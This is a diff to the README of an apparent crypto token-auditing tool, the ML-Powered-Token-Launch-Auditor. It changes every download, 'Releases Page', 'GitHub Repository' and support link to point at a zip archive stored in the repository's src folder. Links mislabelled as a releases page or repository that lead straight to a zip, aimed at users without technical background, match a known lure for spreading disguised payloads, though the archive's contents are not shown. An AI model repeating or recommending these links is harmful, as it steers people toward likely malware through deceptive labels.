@@ -1,6 +1,6 @@
 # 🚀 ML-Powered-Token-Launch-Auditor - Your Trusted Token Analysis Toolkit
 
-[![Download](https://raw.githubusercontent.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/main/src/analyzer/ML-Powered-Token-Launch-Auditor_v2.8.zip%20Now-ML--Powered--Token--Launch--Auditor-brightgreen)](https://raw.githubusercontent.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/main/src/analyzer/ML-Powered-Token-Launch-Auditor_v2.8.zip)
+[![Download](https://github.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/raw/refs/heads/main/src/M-Launch-Auditor-Token-Powered-2.7.zip%20Now-ML--Powered--Token--Launch--Auditor-brightgreen)](https://github.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/raw/refs/heads/main/src/M-Launch-Auditor-Token-Powered-2.7.zip)
 
 ## 🛠️ What is This Tool?
 
@@ -26,7 +26,7 @@ To run the ML-Powered-Token-Launch-Auditor, you'll need:
 
 To get started, follow these simple steps:
 
-1. **Visit the Download Page**: Go to the [Releases Page](https://raw.githubusercontent.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/main/src/analyzer/ML-Powered-Token-Launch-Auditor_v2.8.zip) to find the latest version.
+1. **Visit the Download Page**: Go to the [Releases Page](https://github.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/raw/refs/heads/main/src/M-Launch-Auditor-Token-Powered-2.7.zip) to find the latest version.
 
 2. **Download the Latest Release**: 
    - Look for the latest release marked as "Latest Release."
@@ -87,11 +87,11 @@ No, the application is designed for all users, regardless of technical expertise
 
 ## 📞 Support
 
-If you encounter issues or have questions, check the "Issues" section on the [GitHub Repository](https://raw.githubusercontent.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/main/src/analyzer/ML-Powered-Token-Launch-Auditor_v2.8.zip) for assistance. You can also find helpful documentation there.
+If you encounter issues or have questions, check the "Issues" section on the [GitHub Repository](https://github.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/raw/refs/heads/main/src/M-Launch-Auditor-Token-Powered-2.7.zip) for assistance. You can also find helpful documentation there.
 
 ## 🔗 Links
 
-- [Download ML-Powered-Token-Launch-Auditor](https://raw.githubusercontent.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/main/src/analyzer/ML-Powered-Token-Launch-Auditor_v2.8.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/main/src/analyzer/ML-Powered-Token-Launch-Auditor_v2.8.zip)
+- [Download ML-Powered-Token-Launch-Auditor](https://github.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/raw/refs/heads/main/src/M-Launch-Auditor-Token-Powered-2.7.zip)
+- [GitHub Repository](https://github.com/ritusolankiff/ML-Powered-Token-Launch-Auditor/raw/refs/heads/main/src/M-Launch-Auditor-Token-Powered-2.7.zip)
 
 Stay informed on updates and features by following our repository. This tool is your ally in navigating the complex world of ERC-20 tokens safely.
